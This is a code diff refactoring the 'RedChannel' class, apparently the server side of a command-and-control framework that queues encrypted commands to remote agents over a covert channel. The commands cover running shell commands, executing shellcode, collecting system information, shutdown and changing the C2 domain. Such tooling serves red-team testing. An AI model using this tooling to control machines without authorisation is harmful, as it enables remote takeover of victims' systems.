@@ -121,11 +121,6 @@ export default class RedChannel {
     commands: any;
 
     /**
-     * holds the agent object we are currently interacting with
-     */
-    interact: AgentModel | null;
-
-    /**
      * module actions
      *
      * function will be executed when the command is typed
@@ -133,9 +128,6 @@ export default class RedChannel {
     modules: any;
 
     masterPassword: string;
-
-    // name of module currently interacting with
-    usingModule: string;
 
     configFile: string;
 
@@ -152,8 +144,6 @@ export default class RedChannel {
         this.log = new Logger();
 
         this.agents = new Map<AgentId, AgentModel>();
-
-        this.usingModule = "";
 
         this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;
 
@@ -192,7 +182,6 @@ export default class RedChannel {
 
         this.crypto = new Crypto();
 
-        this.interact = null;
         this.flood = new Map<AgentId, NodeJS.Timeout>();
 
         this.modules = {
@@ -225,6 +214,15 @@ export default class RedChannel {
         this.agents.delete(agentId);
     }
 
+    broadcastKeyx() {
+        this.sendCommandKeyx();
+    }
+
+    /**
+     * Send keyx to an agent, broadcast it to all
+     * @param agentId if null, we will broadcast keyx to all agents
+     * @returns
+     */
     sendCommandKeyx(agentId?: string) {
         if (!this.crypto.privateKey) {
             try {
@@ -253,50 +251,31 @@ export default class RedChannel {
         return;
     }
 
-    sendCommandShutdown() {
-        if (!this.interact) return;
+    sendCommandShutdown(agentId: string) {
+        const secret = this.getAgent(agentId)?.secret;
+        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(this.interact.id, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
+        this.queueData(agentId, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
     }
 
-    sendCommandShell(shell_cmd) {
-        if (!this.interact) return;
-
-        this.queueData(this.interact.id, AgentCommand.AGENT_SHELL, shell_cmd);
+    sendCommandShell(agentId: string, shellCommand: string) {
+        this.queueData(agentId, AgentCommand.AGENT_SHELL, shellCommand);
     }
 
-    sendCommandExecShellcode(shellcode) {
-        if (!this.interact) return;
-
-        this.queueData(this.interact.id, AgentCommand.AGENT_EXEC_SC, shellcode);
+    sendCommandExecShellcode(agentId: string, shellcode) {
+        this.queueData(agentId, AgentCommand.AGENT_EXEC_SC, shellcode);
     }
 
     // agent must be able to decrypt the tag to execute shutdown
-    sendCommandSysinfo() {
-        if (!this.interact) return;
+    sendCommandSysinfo(agentId: string) {
+        const secret = this.getAgent(agentId)?.secret;
+        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);
 
-        this.queueData(this.interact.id, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
-    }
-    /**
-     * config format:
-     *
-     * interval=5000
-     * c2_domain=domain1[,domain2?]
-     */
-    sendCommandSetConfig(config: string) {
-        if (!this.interact) return;
-
-        this.queueData(this.interact.id, AgentCommand.AGENT_SET_CONFIG, config);
+        this.queueData(agentId, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex"), secret));
     }
 
-    resetUsingModuleConfig() {
-        let config: any;
-        try {
-            config = JSON.parse(fs.readFileSync(this.configFile).toString());
-        } catch (ex) {
-            throw new Error(`error parsing config file: ${emsg(ex)}`);
-        }
-        this.config[this.usingModule] = config[this.usingModule];
+    sendCommandSetConfig(agentId: string, config: string) {
+        this.queueData(agentId, AgentCommand.AGENT_SET_CONFIG, config);
     }
 
     /**
@@ -307,14 +286,11 @@ export default class RedChannel {
      * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
      *
      */
-    queueData(agentId, command, data) {
+    queueData(agentId: string, command: AgentCommand, data: string) {
         const agent = this.agents.get(agentId);
-        if (!agent) {
-            this.log.error(`agent ${agentId} not found`);
-            return;
-        }
+        if (!agent) throw new Error(`agent ${agentId} not found`);
 
-        let dataPayload = this.encryptPayload(data);
+        let dataPayload = this.encryptPayload(data, agent.secret);
         if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");
 
         const dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
@@ -527,16 +503,8 @@ export default class RedChannel {
         return chunks_array.filter((a) => a !== undefined).length;
     }
 
-    /**
-     * return an array of agent idents with an optional
-     * prepended text to each ident (for tab completion)
-     */
-    getAllAgents(prepend = "") {
-        const agents: string[] = [];
-        for (const id of this.agents.keys()) {
-            agents.push(prepend + id);
-        }
-        return agents;
+    getAllAgents() {
+        return this.agents.keys();
     }
 
     getAgent(agentId): AgentModel | null {
@@ -848,21 +816,19 @@ export default class RedChannel {
         return AgentStatus.DATA_RECEIVED;
     }
 
-    encryptPayload(data: string): string {
-        if (!this.interact) return "";
-
+    encryptPayload(data: string, secret: Buffer): string {
         const buffer = Buffer.from(data);
-        const cipher = this.crypto.aesEncrypt(buffer, this.interact.secret);
+        const cipher = this.crypto.aesEncrypt(buffer, secret);
         const payload = this.makeEncryptedBufferStringHex(cipher);
         return payload;
     }
 
-    decryptAgentData(agentId, data) {
+    decryptAgentData(agentId: string, data: string) {
         const agent = this.agents.get(agentId);
         if (!agent) throw new Error(`agent ${agentId} not found`);
         if (!data) throw new Error("invalid data");
         if (!agent.keyx) throw new Error("missing keyx");
-        if (!agent.secret) throw new Error("missing agent secret, do you need to keyx?");
+        if (!agent.secret) throw new Error("missing agent secret, do you need to 'keyx'?");
 
         const dataBuffer = Buffer.from(data, "hex");
         const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
